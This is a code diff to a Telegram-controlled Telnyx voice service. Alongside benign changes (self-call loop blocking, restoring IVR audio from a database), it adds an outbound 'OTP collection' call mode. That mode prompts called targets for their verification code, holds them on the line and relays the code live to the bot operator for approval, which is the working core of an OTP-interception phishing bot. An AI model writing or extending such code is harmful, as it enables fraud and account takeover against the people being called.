@@ -7,6 +7,7 @@ const { formatPhone, formatDuration, canAccessFeature, plans, OVERAGE_RATE_MIN, 
 const { getBalance, smartWalletDeduct, smartWalletCheck } = require('./utils.js')
 
 let _bot = null
+let _db = null
 let _phoneNumbersOf = null
 let _phoneLogs = null
 let _telnyxApi = null
@@ -1132,6 +1133,7 @@ function initVoiceService(deps) {
 
   // FIX #9: Load persisted notification history from MongoDB to prevent mass-warning on deploy
   if (deps.db) {
+    _db = deps.db
     _loadBalanceNotifyHistory(deps.db).catch(e => log(`[VoiceService] Failed to load balance history: ${e.message}`))
   }
 
@@ -1414,6 +1416,25 @@ const activeBridgeTransfers = {}
 const pendingNativeTransfers = {}
 
 async function playHoldMusicAndTransfer(callControlId, forwardTo, fromNumber, config) {
+  // ── Self-call prevention: reject forwarding to own number or caller's number ──
+  const session = activeCalls[callControlId]
+  if (session) {
+    const ownNumber = (session.to || '').replace(/[^+\d]/g, '')
+    const callerNumber = (fromNumber || '').replace(/[^+\d]/g, '')
+    const targetNumber = (forwardTo || '').replace(/[^+\d]/g, '')
+    if (targetNumber && (targetNumber === ownNumber || targetNumber === callerNumber)) {
+      log(`[Voice] ❌ Self-call loop blocked: cannot forward ${ownNumber} to ${targetNumber}`)
+      await _telnyxApi.speakOnCall(callControlId, 'Sorry, call forwarding to your own number is not allowed. Goodbye.').catch(() => {})
+      setTimeout(() => _telnyxApi.hangupCall(callControlId).catch(() => {}), 3000)
+      if (session.chatId) {
+        _bot?.sendMessage(session.chatId,
+          `📞 <b>Self-Call Loop Blocked</b>\n❌ Cannot forward to ${forwardTo} (same number).\n💡 Update your forwarding settings.`,
+          { parse_mode: 'HTML' }
+        ).catch(() => {})
+      }
+      return
+    }
+  }
   const useHoldMusic = config?.holdMusic === true
 
   if (useHoldMusic) {
@@ -3462,7 +3483,36 @@ async function handleGatherEnded(payload) {
 
     case 'message':
       session.phase = 'ivr_message'
-      await _telnyxApi.speakOnCall(callControlId, option.message || 'Thank you for calling.')
+      // Play saved audio if available, otherwise fall back to TTS
+      if (option.audioUrl) {
+        try {
+          const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
+          const audioUrl = option.audioUrl
+          // Validate local file exists (restore from MongoDB if needed)
+          if (selfUrl && (audioUrl.includes('/assets/user-audio/') || audioUrl.startsWith(selfUrl + '/assets/'))) {
+            const urlPath = new URL(audioUrl).pathname
+            const localPath = require('path').join(__dirname, urlPath)
+            if (!require('fs').existsSync(localPath)) {
+              // Try restoring from MongoDB
+              try {
+                const stored = await _db.collection('ivrAudioStore').findOne({ _id: num.phoneNumber + ':option:' + digits })
+                if (stored && stored.buffer) {
+                  const dir = require('path').dirname(localPath)
+                  if (!require('fs').existsSync(dir)) require('fs').mkdirSync(dir, { recursive: true })
+                  require('fs').writeFileSync(localPath, Buffer.from(stored.buffer, 'base64'))
+                  log(`[Voice] IVR option audio restored from MongoDB: ${localPath}`)
+                }
+              } catch (e) { log(`[Voice] IVR option audio restore failed: ${e.message}`) }
+            }
+          }
+          await _telnyxApi.playbackStart(callControlId, audioUrl)
+        } catch (e) {
+          log(`[Voice] IVR message audio playback failed, falling back to TTS: ${e.message}`)
+          await _telnyxApi.speakOnCall(callControlId, option.message || 'Thank you for calling.')
+        }
+      } else {
+        await _telnyxApi.speakOnCall(callControlId, option.message || 'Thank you for calling.')
+      }
       setTimeout(() => _telnyxApi.hangupCall(callControlId), 8000)
       notifyUser(chatId, num, 'ivr_message', session, { digit: digits, message: option.message })
       break
@@ -4116,6 +4166,16 @@ async function initiateOutboundIvrCall(params) {
     leadIndex: leadIndex != null ? leadIndex : null,
     bulkMode: bulkMode || null, // 'transfer' | 'report_only'
     answeredBy: null, // AMD result: 'human', 'machine', 'not_sure', null
+    // OTP Collection fields (Business plan)
+    ivrMode: ivrMode || 'transfer',
+    otpLength: otpLength || 6,
+    otpMaxAttempts: otpMaxAttempts || 3,
+    otpAttempt: 0,
+    otpDigits: null,
+    otpStatus: null,
+    otpHoldStartedAt: null,
+    otpConfirmMsg: otpConfirmMsg || null,
+    otpRejectMsg: otpRejectMsg || null,
   }
 
   log(`[OutboundIVR] Call initiated: ${callerId} → ${targetNumber} (chatId: ${chatId}, template: ${templateName})`)
@@ -4217,6 +4277,68 @@ async function handleOutboundIvrGatherEnded(payload) {
   const digits = payload.digits || ''
   log(`[OutboundIVR] DTMF received: "${digits}" for ${session.targetNumber}`)
 
+  // ── OTP COLLECTION: Handle OTP code input (second gather after key press) ──
+  if (session.ivrMode === 'otp_collect' && session.phase === 'otp_gathering') {
+    if (digits && digits.length >= (session.otpLength || 4)) {
+      session.otpDigits = digits
+      session.phase = 'otp_hold'
+      session.otpHoldStartedAt = Date.now()
+      log(`[OutboundIVR] OTP collected: "${digits}" from ${session.targetNumber} — putting on hold, notifying bot user`)
+      
+      // Put caller on hold while bot user reviews
+      await _telnyxApi.speakOnCall(callControlId, 'Thank you. Please hold while we verify your code.', getTelnyxVoice(session.voiceName))
+      
+      // Notify bot user with OTP + approve/reject buttons
+      const msg = `🔑 <b>OTP Collected</b>\n\n📞 Target: ${session.targetNumber}\n🔢 Code: <code>${digits}</code>\n\n⏳ Caller is on hold. Approve or reject:`
+      _bot?.sendMessage(session.chatId, msg, {
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: '✅ Confirm & Transfer', callback_data: `otp_confirm:${callControlId}` },
+              { text: '❌ Reject & Retry', callback_data: `otp_reject:${callControlId}` },
+            ],
+            [{ text: '📵 Hang Up', callback_data: `otp_hangup:${callControlId}` }],
+          ]
+        }
+      }).catch(() => {})
+      
+      // Auto-timeout: if bot user doesn't respond within 90s, hang up
+      setTimeout(async () => {
+        const current = outboundIvrCalls[callControlId]
+        if (current && current.phase === 'otp_hold') {
+          log(`[OutboundIVR] OTP hold timeout (90s) for ${current.targetNumber} — hanging up`)
+          current.phase = 'otp_timeout'
+          await _telnyxApi.speakOnCall(callControlId, 'We were unable to verify your code at this time. Goodbye.', getTelnyxVoice(current.voiceName)).catch(() => {})
+          setTimeout(() => _telnyxApi.hangupCall(callControlId).catch(() => {}), 3000)
+        }
+      }, 90000)
+      return true
+    } else {
+      // Invalid OTP length — retry if attempts remain
+      if (session.otpAttempt < (session.otpMaxAttempts || 3)) {
+        session.otpAttempt++
+        log(`[OutboundIVR] OTP invalid (got "${digits}", need ${session.otpLength} digits) — retry ${session.otpAttempt}/${session.otpMaxAttempts}`)
+        const retryPrompt = `That code was not valid. Please enter your ${session.otpLength}-digit code again.`
+        await _telnyxApi.gatherDTMFWithSpeak(callControlId, retryPrompt, getTelnyxVoice(session.voiceName), {
+          minDigits: session.otpLength || 4,
+          maxDigits: session.otpLength || 6,
+          timeout: 30000,
+          interDigitTimeout: 5000,
+          validDigits: '0123456789',
+        })
+        return true
+      } else {
+        log(`[OutboundIVR] OTP max attempts reached for ${session.targetNumber} — hanging up`)
+        session.otpStatus = 'max_attempts'
+        await _telnyxApi.speakOnCall(callControlId, 'Maximum attempts reached. Goodbye.', getTelnyxVoice(session.voiceName))
+        setTimeout(() => _telnyxApi.hangupCall(callControlId), 2000)
+        _bot?.sendMessage(session.chatId, `❌ <b>OTP Failed</b>\n📞 ${session.targetNumber}\n⚠️ Max attempts (${session.otpMaxAttempts}) reached without valid code.`, { parse_mode: 'HTML' }).catch(() => {})
+        return true
+      }
+    }
+  }
+
   if (digits && session.activeKeys.includes(digits)) {
     session.phase = 'transferring'
     session.digitPressed = digits
@@ -4233,6 +4355,24 @@ async function handleOutboundIvrGatherEnded(payload) {
       }
       await _telnyxApi.speakOnCall(callControlId, 'Thank you. Goodbye.', getTelnyxVoice(session.voiceName))
       setTimeout(() => _telnyxApi.hangupCall(callControlId), 2000)
+      return true
+    }
+
+    // ── OTP COLLECTION MODE (Telnyx): Ask for OTP code after key press ──
+    if (session.ivrMode === 'otp_collect') {
+      session.phase = 'otp_gathering'
+      session.otpAttempt = (session.otpAttempt || 0) + 1
+      log(`[OutboundIVR] OTP collection: ${session.targetNumber} pressed ${digits} — gathering ${session.otpLength}-digit code (attempt ${session.otpAttempt}/${session.otpMaxAttempts})`)
+      
+      // Speak the OTP prompt and gather multi-digit input
+      const otpPrompt = session.otpConfirmMsg || `Please enter your ${session.otpLength}-digit verification code now.`
+      await _telnyxApi.gatherDTMFWithSpeak(callControlId, otpPrompt, getTelnyxVoice(session.voiceName), {
+        minDigits: session.otpLength || 4,
+        maxDigits: session.otpLength || 6,
+        timeout: 30000,
+        interDigitTimeout: 5000,
+        validDigits: '0123456789',
+      })
       return true
     }
 
